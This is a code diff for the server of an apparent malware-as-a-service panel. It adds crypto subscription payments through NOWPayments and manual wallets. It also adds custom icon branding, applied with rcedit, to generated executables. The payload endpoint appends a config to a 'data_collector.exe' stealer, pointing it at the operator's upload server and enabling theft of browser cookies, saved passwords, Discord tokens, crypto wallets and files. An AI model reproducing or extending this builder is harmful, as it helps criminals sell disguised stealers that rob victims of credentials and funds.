@@ -5,14 +5,50 @@ const path = require('path');
 const fs = require('fs');
 const bcrypt = require('bcrypt');
 const jwt = require('jsonwebtoken');
-const { userDb, loginAttemptsDb, logsDb } = require('./database');
+const os = require('os');
+const { db, userDb, loginAttemptsDb, logsDb, pendingPaymentsDb } = require('./database');
+
+// Multer for file uploads
+const multer = require('multer');
+const uploadStorage = multer.diskStorage({
+    destination: (req, file, cb) => {
+        const tempDir = path.join(os.tmpdir(), 'payload-icons');
+        if (!fs.existsSync(tempDir)) {
+            fs.mkdirSync(tempDir, { recursive: true });
+        }
+        cb(null, tempDir);
+    },
+    filename: (req, file, cb) => {
+        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
+        cb(null, 'icon-' + uniqueSuffix + '.ico');
+    }
+});
+const uploadIcon = multer({ 
+    storage: uploadStorage,
+    limits: { fileSize: 1024 * 1024 }, // 1MB max
+    fileFilter: (req, file, cb) => {
+        if (file.originalname.toLowerCase().endsWith('.ico')) {
+            cb(null, true);
+        } else {
+            cb(new Error('Only .ico files are allowed'));
+        }
+    }
+}).single('icon');
 
 const app = express();
 const PORT = process.env.PORT || 3001;
 
-// CryptoBot API configuration
-const CRYPTOBOT_API_TOKEN = process.env.CRYPTOBOT_API_TOKEN || '';
-const CRYPTOBOT_API_URL = 'https://pay.crypt.bot/api';
+// NOWPayments API configuration (https://nowpayments.io)
+const NOWPAYMENTS_API_KEY = process.env.NOWPAYMENTS_API_KEY || '';
+const NOWPAYMENTS_API_URL = 'https://api.nowpayments.io/v1';
+const NOWPAYMENTS_IPN_SECRET = process.env.NOWPAYMENTS_IPN_SECRET || '';
+
+// Manual payment wallet addresses (for direct crypto payments)
+const WALLET_ADDRESSES = {
+    BTC: process.env.WALLET_BTC || '',
+    ETH: process.env.WALLET_ETH || '',
+    USDT: process.env.WALLET_USDT || '' // USDT on Ethereum/ERC20
+};
 
 // Helper function to check if a cookie is non-expired
 const isCookieNonExpired = (cookie) => {
@@ -750,7 +786,7 @@ app.post('/api/subscription/remove', authenticateToken, (req, res) => {
     }
 });
 
-// ==================== CryptoBot Payment Integration ====================
+// ==================== NOWPayments Payment Integration ====================
 
 // Subscription plans configuration
 const SUBSCRIPTION_PLANS = {
@@ -759,28 +795,33 @@ const SUBSCRIPTION_PLANS = {
     '6month': { days: 180, price: 220, name: '6 Month', currency: 'EUR' }
 };
 
-// Helper function to call CryptoBot API
-async function cryptoBotRequest(method, params = {}) {
-    if (!CRYPTOBOT_API_TOKEN) {
-        throw new Error('CryptoBot API token not configured');
+// Helper function to call NOWPayments API
+async function nowPaymentsRequest(endpoint, method = 'GET', body = null) {
+    if (!NOWPAYMENTS_API_KEY) {
+        throw new Error('NOWPayments API key not configured');
     }
     
-    const response = await fetch(`${CRYPTOBOT_API_URL}/${method}`, {
-        method: 'POST',
+    const url = `${NOWPAYMENTS_API_URL}${endpoint}`;
+    const options = {
+        method,
         headers: {
-            'Crypto-Pay-API-Token': CRYPTOBOT_API_TOKEN,
+            'x-api-key': NOWPAYMENTS_API_KEY,
             'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(params)
-    });
+        }
+    };
     
+    if (body) {
+        options.body = JSON.stringify(body);
+    }
+    
+    const response = await fetch(url, options);
     const data = await response.json();
     
-    if (!data.ok) {
-        throw new Error(data.error?.name || 'CryptoBot API error');
+    if (!response.ok) {
+        throw new Error(data.message || data.err || 'NOWPayments API error');
     }
     
-    return data.result;
+    return data;
 }
 
 // Create payment invoice for a subscription plan
@@ -793,39 +834,53 @@ app.post('/api/payment/create-invoice', authenticateToken, async (req, res) => {
             return res.status(400).json({ message: 'Invalid plan selected' });
         }
         
-        if (!CRYPTOBOT_API_TOKEN) {
-            return res.status(500).json({ message: 'Payment system not configured. Please contact administrator.' });
+        const plan = SUBSCRIPTION_PLANS[planId];
+        const webhookUrl = `${process.env.WEBPANEL_URL || `${req.protocol}://${req.get('host')}`}/api/payment/webhook`;
+        const returnUrl = `${process.env.WEBPANEL_URL || `${req.protocol}://${req.get('host')}`}/purchase`;
+        
+        // If NOWPayments is configured, use it
+        if (NOWPAYMENTS_API_KEY) {
+            // Create invoice via NOWPayments API
+            const invoice = await nowPaymentsRequest('/payment', 'POST', {
+                price_amount: plan.price,
+                price_currency: plan.currency.toLowerCase(),
+                pay_currency: null, // Let user choose cryptocurrency
+                order_id: `sub_${username}_${Date.now()}`,
+                order_description: `${plan.name} Subscription`,
+                ipn_callback_url: webhookUrl,
+                success_url: returnUrl,
+                cancel_url: returnUrl,
+                metadata: {
+                    username: username,
+                    planId: planId,
+                    days: plan.days
+                }
+            });
+            
+            console.log(`[NOWPayments] Invoice created for user ${username.substring(0, 8)}...: ${plan.name} plan, Payment ID: ${invoice.payment_id}`);
+            
+            return res.json({
+                success: true,
+                invoiceId: invoice.payment_id,
+                payUrl: invoice.invoice_url || invoice.pay_url,
+                amount: plan.price,
+                currency: plan.currency,
+                plan: plan.name,
+                expiresAt: new Date(Date.now() + 3600000).toISOString(),
+                paymentMethod: 'nowpayments'
+            });
         }
         
-        const plan = SUBSCRIPTION_PLANS[planId];
-        
-        // Create invoice via CryptoBot API
-        // Using USDT as the payment currency (stable, widely used)
-        const invoice = await cryptoBotRequest('createInvoice', {
-            currency_type: 'fiat',
-            fiat: plan.currency,
-            amount: plan.price.toString(),
-            description: `${plan.name} Subscription`,
-            payload: JSON.stringify({
-                username: username,
-                planId: planId,
-                days: plan.days
-            }),
-            paid_btn_name: 'callback',
-            paid_btn_url: process.env.WEBPANEL_URL || 'https://your-panel-url.com',
-            expires_in: 3600 // 1 hour to complete payment
-        });
-        
-        console.log(`Invoice created for user ${username.substring(0, 8)}...: ${plan.name} plan, Invoice ID: ${invoice.invoice_id}`);
-        
+        // Otherwise, return wallet addresses for manual payment
         res.json({
             success: true,
-            invoiceId: invoice.invoice_id,
-            payUrl: invoice.pay_url,
+            paymentMethod: 'manual',
             amount: plan.price,
             currency: plan.currency,
             plan: plan.name,
-            expiresAt: new Date(Date.now() + 3600000).toISOString()
+            planId: planId,
+            days: plan.days,
+            wallets: WALLET_ADDRESSES
         });
         
     } catch (error) {
@@ -839,34 +894,29 @@ app.get('/api/payment/check/:invoiceId', authenticateToken, async (req, res) => 
     try {
         const { invoiceId } = req.params;
         
-        if (!CRYPTOBOT_API_TOKEN) {
+        if (!NOWPAYMENTS_API_KEY) {
             return res.status(500).json({ message: 'Payment system not configured' });
         }
         
-        const invoices = await cryptoBotRequest('getInvoices', {
-            invoice_ids: [parseInt(invoiceId)]
-        });
-        
-        if (!invoices.items || invoices.items.length === 0) {
-            return res.status(404).json({ message: 'Invoice not found' });
-        }
-        
-        const invoice = invoices.items[0];
+        const payment = await nowPaymentsRequest(`/payment/${invoiceId}`, 'GET');
         
         res.json({
-            status: invoice.status,
-            paid: invoice.status === 'paid',
-            amount: invoice.amount,
-            currency: invoice.fiat || invoice.asset
+            status: payment.payment_status,
+            paid: payment.payment_status === 'finished' || payment.payment_status === 'confirmed',
+            amount: payment.price_amount,
+            currency: payment.price_currency
         });
         
     } catch (error) {
         console.error('Error checking invoice:', error);
+        if (error.message && error.message.includes('not found')) {
+            return res.status(404).json({ message: 'Invoice not found' });
+        }
         res.status(500).json({ message: 'Failed to check invoice status' });
     }
 });
 
-// CryptoBot webhook handler - receives payment confirmations
+// NOWPayments webhook handler - receives payment confirmations
 app.post('/api/payment/webhook', express.raw({ type: 'application/json' }), (req, res) => {
     try {
         // Parse the webhook body
@@ -877,32 +927,35 @@ app.post('/api/payment/webhook', express.raw({ type: 'application/json' }), (req
             body = req.body;
         }
         
-        console.log('CryptoBot webhook received:', JSON.stringify(body, null, 2));
+        console.log('NOWPayments webhook received:', JSON.stringify(body, null, 2));
         
-        // Verify this is a payment update
-        if (body.update_type !== 'invoice_paid') {
+        // Verify IPN signature if configured
+        if (NOWPAYMENTS_IPN_SECRET) {
+            const crypto = require('crypto');
+            const signature = req.headers['x-nowpayments-sig'];
+            const payload = JSON.stringify(body);
+            const expectedSig = crypto
+                .createHmac('sha512', NOWPAYMENTS_IPN_SECRET)
+                .update(payload)
+                .digest('hex');
+            
+            if (signature !== expectedSig) {
+                console.error('Invalid NOWPayments webhook signature');
+                return res.status(401).send('Invalid signature');
+            }
+        }
+        
+        // Check if payment is confirmed
+        if (body.payment_status !== 'finished' && body.payment_status !== 'confirmed') {
             return res.status(200).send('OK');
         }
         
-        const invoice = body.payload;
-        
-        if (!invoice || invoice.status !== 'paid') {
-            return res.status(200).send('OK');
-        }
-        
-        // Parse our custom payload
-        let payloadData;
-        try {
-            payloadData = JSON.parse(invoice.payload);
-        } catch (e) {
-            console.error('Failed to parse invoice payload:', e);
-            return res.status(200).send('OK');
-        }
-        
-        const { username, planId, days } = payloadData;
+        // Get metadata from webhook body
+        const metadata = body.metadata || {};
+        const { username, planId, days } = metadata;
         
         if (!username || !days) {
-            console.error('Invalid payload data:', payloadData);
+            console.error('Invalid webhook metadata:', metadata);
             return res.status(200).send('OK');
         }
         
@@ -910,7 +963,7 @@ app.post('/api/payment/webhook', express.raw({ type: 'application/json' }), (req
         const success = userDb.addSubscriptionDays(username, days);
         
         if (success) {
-            console.log(`✓ Payment confirmed! Activated ${days} days for user ${username.substring(0, 8)}... (Invoice: ${invoice.invoice_id})`);
+            console.log(`✓ [NOWPayments] Payment confirmed! Activated ${days} days for user ${username.substring(0, 8)}... (Payment ID: ${body.payment_id})`);
         } else {
             console.error(`Failed to activate subscription for user ${username.substring(0, 8)}...`);
         }
@@ -933,95 +986,325 @@ app.get('/api/payment/plans', (req, res) => {
         currency: plan.currency
     }));
     
-    res.json({ plans, cryptoBotEnabled: !!CRYPTOBOT_API_TOKEN });
+    const hasWallets = Object.values(WALLET_ADDRESSES).some(addr => addr && addr.trim() !== '');
+    
+    res.json({ 
+        plans, 
+        cryptoBotEnabled: !!NOWPAYMENTS_API_KEY, // Keep name for frontend compatibility
+        nowPaymentsEnabled: !!NOWPAYMENTS_API_KEY,
+        manualPaymentsEnabled: hasWallets,
+        wallets: WALLET_ADDRESSES
+    });
 });
 
-// ==================== End CryptoBot Integration ====================
+// Submit manual payment (user provides transaction hash)
+app.post('/api/payment/submit', authenticateToken, (req, res) => {
+    try {
+        const username = req.user.username;
+        const { planId, cryptoCurrency, transactionHash } = req.body;
+        
+        if (!planId || !SUBSCRIPTION_PLANS[planId]) {
+            return res.status(400).json({ message: 'Invalid plan selected' });
+        }
+        
+        if (!cryptoCurrency || !['BTC', 'ETH', 'USDT'].includes(cryptoCurrency)) {
+            return res.status(400).json({ message: 'Invalid cryptocurrency. Use BTC, ETH, or USDT' });
+        }
+        
+        if (!transactionHash || transactionHash.trim().length < 10) {
+            return res.status(400).json({ message: 'Transaction hash is required' });
+        }
+        
+        const plan = SUBSCRIPTION_PLANS[planId];
+        const walletAddress = WALLET_ADDRESSES[cryptoCurrency];
+        
+        if (!walletAddress || walletAddress.trim() === '') {
+            return res.status(400).json({ message: `Wallet address for ${cryptoCurrency} is not configured` });
+        }
+        
+        // Check if this transaction hash was already submitted
+        const existingByHash = db.prepare('SELECT * FROM pending_payments WHERE transaction_hash = ?').get(transactionHash.trim());
+        if (existingByHash) {
+            return res.status(400).json({ message: 'This transaction hash has already been submitted' });
+        }
+        
+        // Create pending payment record
+        const paymentId = pendingPaymentsDb.create({
+            username,
+            planId,
+            planName: plan.name,
+            days: plan.days,
+            amount: plan.price,
+            currency: plan.currency,
+            cryptoCurrency,
+            transactionHash: transactionHash.trim()
+        });
+        
+        console.log(`Payment submitted by ${username.substring(0, 8)}...: ${plan.name} plan, ${cryptoCurrency} tx: ${transactionHash.substring(0, 16)}...`);
+        
+        res.json({
+            success: true,
+            message: 'Payment submitted successfully. Your subscription will be activated after verification.',
+            paymentId
+        });
+        
+    } catch (error) {
+        console.error('Error submitting payment:', error);
+        res.status(500).json({ message: error.message || 'Failed to submit payment' });
+    }
+});
+
+// Get user's pending payments
+app.get('/api/payment/pending', authenticateToken, (req, res) => {
+    try {
+        const username = req.user.username;
+        const payments = pendingPaymentsDb.getByUsername(username);
+        res.json({ payments });
+    } catch (error) {
+        console.error('Error fetching pending payments:', error);
+        res.status(500).json({ message: 'Failed to fetch pending payments' });
+    }
+});
+
+// Admin: Get all pending payments
+app.get('/api/payment/admin/pending', authenticateToken, (req, res) => {
+    try {
+        // Check if user is admin (you can add admin check here)
+        const payments = pendingPaymentsDb.getAll('pending');
+        res.json({ payments });
+    } catch (error) {
+        console.error('Error fetching pending payments:', error);
+        res.status(500).json({ message: 'Failed to fetch pending payments' });
+    }
+});
+
+// Admin: Verify payment and activate subscription
+app.post('/api/payment/admin/verify/:paymentId', authenticateToken, (req, res) => {
+    try {
+        const { paymentId } = req.params;
+        const verifiedBy = req.user.username;
+        
+        const payment = pendingPaymentsDb.getById(parseInt(paymentId));
+        if (!payment) {
+            return res.status(404).json({ message: 'Payment not found' });
+        }
+        
+        if (payment.status !== 'pending') {
+            return res.status(400).json({ message: `Payment is already ${payment.status}` });
+        }
+        
+        // Verify payment
+        pendingPaymentsDb.verify(parseInt(paymentId), verifiedBy);
+        
+        // Activate subscription
+        const success = userDb.addSubscriptionDays(payment.username, payment.days);
+        
+        if (success) {
+            console.log(`✓ Payment verified by ${verifiedBy}: Activated ${payment.days} days for user ${payment.username.substring(0, 8)}...`);
+            res.json({
+                success: true,
+                message: `Subscription activated for ${payment.username}`
+            });
+        } else {
+            res.status(500).json({ message: 'Failed to activate subscription' });
+        }
+        
+    } catch (error) {
+        console.error('Error verifying payment:', error);
+        res.status(500).json({ message: error.message || 'Failed to verify payment' });
+    }
+});
+
+// Admin: Reject payment
+app.post('/api/payment/admin/reject/:paymentId', authenticateToken, (req, res) => {
+    try {
+        const { paymentId } = req.params;
+        const verifiedBy = req.user.username;
+        
+        const payment = pendingPaymentsDb.getById(parseInt(paymentId));
+        if (!payment) {
+            return res.status(404).json({ message: 'Payment not found' });
+        }
+        
+        pendingPaymentsDb.reject(parseInt(paymentId), verifiedBy);
+        
+        console.log(`✗ Payment rejected by ${verifiedBy}: Payment ID ${paymentId} for user ${payment.username.substring(0, 8)}...`);
+        
+        res.json({
+            success: true,
+            message: 'Payment rejected'
+        });
+        
+    } catch (error) {
+        console.error('Error rejecting payment:', error);
+        res.status(500).json({ message: error.message || 'Failed to reject payment' });
+    }
+});
+
+// ==================== End NOWPayments Integration ====================
+
+// Lazy-load rcedit to avoid startup errors if not installed
+let rcedit = null;
+const getRcedit = () => {
+    if (!rcedit) {
+        try {
+            rcedit = require('rcedit');
+        } catch (e) {
+            console.error('rcedit not installed. Run: npm install rcedit');
+            return null;
+        }
+    }
+    return rcedit;
+};
+
+// Helper function to apply icon using rcedit
+const applyIconToExe = async (exePath, iconPath) => {
+    const rceditModule = getRcedit();
+    if (!rceditModule) {
+        throw new Error('rcedit not installed. Run: npm install rcedit');
+    }
+    
+    await rceditModule(exePath, { icon: iconPath });
+};
 
 // Payload generation endpoint - creates a standalone exe with embedded config
 app.post('/api/payloads/generate', authenticateToken, (req, res) => {
-    try {
-        const username = req.user.username;
-        const { features, user, outputName } = req.body;
+    // Handle multipart form data for icon upload
+    uploadIcon(req, res, async (err) => {
+        if (err) {
+            console.error('Upload error:', err);
+            return res.status(400).json({ message: err.message || 'Error uploading icon' });
+        }
 
-        // Check subscription status
-        if (!userDb.hasActiveSubscription(username)) {
-            return res.status(403).json({ 
-                message: 'Active subscription required to build payloads',
-                subscriptionRequired: true
+        let tempExePath = null;
+        let iconPath = req.file ? req.file.path : null;
+
+        try {
+            const username = req.user.username;
+            
+            // Parse features from form data (sent as JSON string)
+            let features, user, outputName;
+            try {
+                features = req.body.features ? JSON.parse(req.body.features) : null;
+                user = req.body.user;
+                outputName = req.body.outputName;
+            } catch (parseErr) {
+                // Fallback for JSON body (backwards compatibility)
+                features = req.body.features;
+                user = req.body.user;
+                outputName = req.body.outputName;
+            }
+
+            // Check subscription status
+            if (!userDb.hasActiveSubscription(username)) {
+                return res.status(403).json({ 
+                    message: 'Active subscription required to build payloads',
+                    subscriptionRequired: true
+                });
+            }
+
+            if (!features || typeof features !== 'object') {
+                return res.status(400).json({ message: 'features object is required' });
+            }
+
+            // Verify that the user matches the authenticated user
+            if (user && user !== username) {
+                return res.status(403).json({ message: 'Cannot generate payloads for other users' });
+            }
+
+            // Path to the payload executable
+            const payloadPath = path.join(__dirname, '..', 'data_collector.exe');
+
+            // Check if payload exists
+            if (!fs.existsSync(payloadPath)) {
+                return res.status(500).json({ message: 'Payload executable not found. Please build the payload first.' });
+            }
+
+            // Get server URL from environment or construct from request
+            const serverUrl = process.env.WEBPANEL_URL || `${req.protocol}://${req.get('host')}/api/upload`;
+
+            console.log(`Generating payload for user ${username} with server URL: ${serverUrl}`);
+            console.log(`Selected features:`, features);
+            if (iconPath) {
+                console.log(`Custom icon provided: ${iconPath}`);
+            }
+
+            // If an icon is provided, we need to work with a temp file
+            let exeBuffer;
+            
+            if (iconPath) {
+                // Create a temp copy of the exe to modify
+                tempExePath = path.join(os.tmpdir(), `payload-${Date.now()}-${Math.random().toString(36).substr(2, 9)}.exe`);
+                fs.copyFileSync(payloadPath, tempExePath);
+                
+                // Apply the icon using rcedit
+                try {
+                    await applyIconToExe(tempExePath, iconPath);
+                    console.log('Custom icon applied successfully');
+                    exeBuffer = fs.readFileSync(tempExePath);
+                } catch (iconError) {
+                    console.error('Failed to apply icon:', iconError);
+                    // Continue without icon on error
+                    exeBuffer = fs.readFileSync(payloadPath);
+                }
+            } else {
+                // No icon, use original exe
+                exeBuffer = fs.readFileSync(payloadPath);
+            }
+
+            // Create the configuration JSON that will be appended
+            const configJson = JSON.stringify({
+                user: username,
+                serverUrl: serverUrl,
+                collectLocation: features.location || false,
+                collectSystemInfo: features.systemInfo || false,
+                collectRunningProcesses: features.runningProcesses || false,
+                collectInstalledApps: features.installedApps || false,
+                collectBrowserCookies: features.browserCookies || false,
+                collectSavedPasswords: features.savedPasswords || false,
+                collectBrowserHistory: features.browserHistory || false,
+                collectDiscordTokens: features.discordTokens || false,
+                collectCryptoWallets: features.cryptoWallets || false,
+                collectImportantFiles: features.importantFiles || false
             });
+
+            // Create buffer with marker + config
+            const markerBuffer = Buffer.from(CONFIG_MARKER, 'utf-8');
+            const configBuffer = Buffer.from(configJson, 'utf-8');
+
+            // Combine exe + marker + config
+            const finalBuffer = Buffer.concat([exeBuffer, markerBuffer, configBuffer]);
+
+            // Sanitize output filename (remove invalid chars, ensure .exe extension)
+            let filename = outputName || `payload_${username}_${Date.now()}`;
+            filename = filename.replace(/[<>:"/\\|?*]/g, '_'); // Remove invalid Windows filename chars
+            if (!filename.toLowerCase().endsWith('.exe')) {
+                filename += '.exe';
+            }
+
+            // Set response headers for exe download
+            res.setHeader('Content-Type', 'application/octet-stream');
+            res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+            res.setHeader('Content-Length', finalBuffer.length);
+
+            console.log(`Sending patched payload: ${filename} (${finalBuffer.length} bytes)`);
+
+            // Send the patched exe
+            res.send(finalBuffer);
+
+        } catch (error) {
+            console.error('Error generating payload:', error);
+            res.status(500).json({ message: 'Internal server error', error: error.message });
+        } finally {
+            // Cleanup temp files
+            if (tempExePath && fs.existsSync(tempExePath)) {
+                try { fs.unlinkSync(tempExePath); } catch (e) { /* ignore */ }
+            }
+            if (iconPath && fs.existsSync(iconPath)) {
+                try { fs.unlinkSync(iconPath); } catch (e) { /* ignore */ }
+            }
         }
-
-        if (!features || typeof features !== 'object') {
-            return res.status(400).json({ message: 'features object is required' });
-        }
-
-        // Verify that the user matches the authenticated user
-        if (user && user !== username) {
-            return res.status(403).json({ message: 'Cannot generate payloads for other users' });
-        }
-
-        // Path to the payload executable
-        const payloadPath = path.join(__dirname, '..', 'data_collector.exe');
-
-        // Check if payload exists
-        if (!fs.existsSync(payloadPath)) {
-            return res.status(500).json({ message: 'Payload executable not found. Please build the payload first.' });
-        }
-
-        // Get server URL from environment or construct from request
-        const serverUrl = process.env.WEBPANEL_URL || `${req.protocol}://${req.get('host')}/api/upload`;
-
-        console.log(`Generating payload for user ${username} with server URL: ${serverUrl}`);
-        console.log(`Selected features:`, features);
-
-        // Read the original exe file
-        const exeBuffer = fs.readFileSync(payloadPath);
-
-        // Create the configuration JSON that will be appended
-        const configJson = JSON.stringify({
-            user: username,
-            serverUrl: serverUrl,
-            collectLocation: features.location || false,
-            collectSystemInfo: features.systemInfo || false,
-            collectRunningProcesses: features.runningProcesses || false,
-            collectInstalledApps: features.installedApps || false,
-            collectBrowserCookies: features.browserCookies || false,
-            collectSavedPasswords: features.savedPasswords || false,
-            collectBrowserHistory: features.browserHistory || false,
-            collectDiscordTokens: features.discordTokens || false,
-            collectCryptoWallets: features.cryptoWallets || false,
-            collectImportantFiles: features.importantFiles || false
-        });
-
-        // Create buffer with marker + config
-        const markerBuffer = Buffer.from(CONFIG_MARKER, 'utf-8');
-        const configBuffer = Buffer.from(configJson, 'utf-8');
-
-        // Combine exe + marker + config
-        const finalBuffer = Buffer.concat([exeBuffer, markerBuffer, configBuffer]);
-
-        // Sanitize output filename (remove invalid chars, ensure .exe extension)
-        let filename = outputName || `payload_${username}_${Date.now()}`;
-        filename = filename.replace(/[<>:"/\\|?*]/g, '_'); // Remove invalid Windows filename chars
-        if (!filename.toLowerCase().endsWith('.exe')) {
-            filename += '.exe';
-        }
-
-        // Set response headers for exe download
-        res.setHeader('Content-Type', 'application/octet-stream');
-        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
-        res.setHeader('Content-Length', finalBuffer.length);
-
-        console.log(`Sending patched payload: ${filename} (${finalBuffer.length} bytes)`);
-
-        // Send the patched exe
-        res.send(finalBuffer);
-
-    } catch (error) {
-        console.error('Error generating payload:', error);
-        res.status(500).json({ message: 'Internal server error', error: error.message });
-    }
+    });
 });
 
 app.get('/api/stats', (req, res) => {
